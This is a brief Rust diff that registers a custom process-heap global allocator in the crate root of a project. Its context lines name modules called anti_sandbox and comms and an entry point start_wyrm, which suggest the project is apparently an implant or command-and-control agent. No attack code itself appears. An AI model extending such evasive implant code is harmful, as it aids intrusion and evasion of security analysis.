@@ -3,7 +3,12 @@
 #![feature(const_option_ops)]
 #![feature(const_trait_impl)]
 
+#[global_allocator]
+static GLOBAL_ALLOC: ProcessHeapAlloc = ProcessHeapAlloc;
+
 use entry::start_wyrm;
+
+use crate::utils::allocate::ProcessHeapAlloc;
 
 mod anti_sandbox;
 mod comms;
